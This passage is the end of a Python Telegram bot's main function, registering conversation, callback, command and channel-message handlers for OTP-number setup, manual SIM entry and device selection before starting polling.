        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)

    # Manual SIM conversation
    manual_sim_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(manual_sim_callback, pattern="^manual_sim_")],
        states={
            WAITING_MANUAL_SIM: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_sim_input)]
        },
        fallbacks=[CommandHandler("cancel", manual_sim_cancel)],
    )
    app.add_handler(manual_sim_conv)

    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    app.add_handler(CallbackQueryHandler(back_to_devices_callback, pattern="^back_to_devices$"))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))

    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))

    logger.info("🤖 Bot started - Final Version with Manual SIM Entry! 🚀")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()